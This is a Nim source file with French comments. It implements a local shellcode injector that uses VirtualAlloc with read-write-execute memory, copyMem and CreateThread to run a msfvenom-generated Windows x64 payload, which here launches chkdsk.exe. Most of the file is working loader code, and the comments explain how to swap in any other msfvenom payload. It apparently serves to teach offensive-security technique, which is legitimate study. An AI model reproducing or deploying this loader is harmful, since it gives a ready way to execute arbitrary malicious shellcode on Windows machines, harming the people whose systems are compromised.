
 # Winim est une bibliothèque Nim qui fournit des bindings (liaisons) vers l’API Win32 de Windows. 
 # En clair: elle permet d’appeler des fonctions Windows natifs directement depuis du Nim

import winim 

proc injectLocal[I, T](shellcode: var array[I, T]): void =

    # VirtualAlloc est une API Windows qui permet de réserver et d’allouer de la mémoire à un niveau bas, 
    # en dehors du heap géré par Nim 

    # Allocation de mémoire de la taille du shellcode
    # nil (ou null), on laisse le système choisir l’adresse d’allocation.

# Ce que fait VirtualAlloc avec lpAddress = NULL
# VirtualAlloc alloue de la mémoire dans l’espace d’adresses virtuelles du processus.
# Si lpAddress (premier paramètre) est NULL, Windows choisit l’adresse où placer l’allocation.
# On peut préciser la taille (dwSize) et le type d’allocation 
# (MEM_COMMIT, MEM_RESERVE, ou les deux) ainsi que la protection (PAGE_READWRITE, PAGE_EXECUTE_READ, etc.).
   
    let executable_memory = VirtualAlloc(
        nil,
        len(shellcode),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    

    # copie le shellcode dans la region assignée avec la proc copyMem qui appartient à la librairie de Nim
    # Prend deux pointeurs (dest et source) et une taille en octets.
    # Copie les octets de la source vers la destination.
    copyMem(executable_memory, shellcode[0].addr, len(shellcode))

    # Createthread est une API Windows (kernel32.dll) qui permet de créer directement un thread au niveau natif. 
    # En Nim, on peut l’appeler comme n’importe quelle fonction C, 
    # pour lancer du code en parallèle en dehors du thread Nim standard.
    
    # Crée un nouveau thread dans le processus courant et retourne un HANDLE vers 
    # ce thread (ici, le code ne semble pas stocker ce handle, mais il existe en réalité).
    # Parameters:

    # nil (premier argument): sécurité des attributs du thread. nil signifie que les attributs par défaut sont utilisés.
    
    # 0 (deuxième argument): taille de la pile du thread. 0 indique d’utiliser la taille par défaut du système.
    
    # castLPTHREAD_START_ROUTINE (troisième argument): pointeur vers la fonction que le thread doit exécuter. 
    # Ici, on cast le contenu ou l’emplacement mémoire référencé par executable_memory en LPTHREAD_START_ROUTINE, 
    # c’est-à-dire une adresse de fonction conforme au prototype DWORD WINAPI ThreadProc(LPVOID lpParameter).
    
    # nil (quatrième argument): paramètre passé à la fonction du thread. nil signifie qu’aucun paramètre n’est donné.
    
    # 0 (cinquième argument): flags de création. 0 signifie créer le thread immédiatement (pas de démarrage différé).
    
    # castLPDWORD (sixième argument): emplacement où stocker l’identifiant du thread (thread id). 
    # 0 signifie qu’on n’enregistre pas l’ID du thread.

    let tHandle = CreateThread(
        nil, 
        0,
        cast[LPTHREAD_START_ROUTINE](executable_memory),
        nil,
        0, 
        cast[LPDWORD](0)
    )
    
    # defer en Nim est une construction pratique pour garantir que 
    # certaines actions de nettoyage soient effectuées quand on sort d’un scope, même en cas d’erreur ou d’exception.

     # CloseHandle est une API Windows (kernel32.dll) qui permet de fermer proprement un handle vers 
     # une ressource système
     # Fermer les handles libère la ressource côté noyau et évite les fuites de ressources.
    defer: CloseHandle(tHandle)

    # discard en Nim est une instruction qui sert à dire explicitement “je n’ai pas besoin du résultat de cette expression”
    
    # WaitForSingleObject est une API Windows (kernel32.dll) qui permet d’attendre qu’un objet SYNCHRONISABLE 
    # soit signalé ou qu’un timeout se produise. C’est utilisé après avoir obtenu un handle sur un thread 
    # pour synchroniser l’exécution.
    discard WaitForSingleObject(tHandle, -1)

    # Précise que le programme est compilé pour windows
when defined(windows):
    # le shellcode est un array de bytes. Ici permet d'exécuter checkdisk

    # msfvenom -p windows/x64/exec CMD="C:\windows\system32\chkdsk.exe" EXITFUNC=thread -f nim
    #msfvenom est l’outil de la suite Metasploit qui sert à créer des payloads (charges utiles)
    #si on veut faire une action on peut générer le array d'un autre programme avec msfvenom

    var shellcode: array[298, byte] = [
    byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
    0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
    0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
    0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
    0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
    0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
    0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
    0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
    0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
    0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
    0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
    0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
    0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
    0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
    0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
    0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
    0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
    0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,
    0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
    0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
    0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,0x77,0x69,0x6e,0x64,0x6f,
    0x77,0x73,0x5c,0x73,0x79,0x73,0x74,0x65,0x6d,0x33,0x32,0x5c,
    0x63,0x68,0x6b,0x64,0x73,0x6b,0x2e,0x65,0x78,0x65,0x00]

    # Le programme commence ici par un appel de la proc injectLocal en lui passant le tableau de bytes
    when isMainModule:
        injectLocal(shellcode)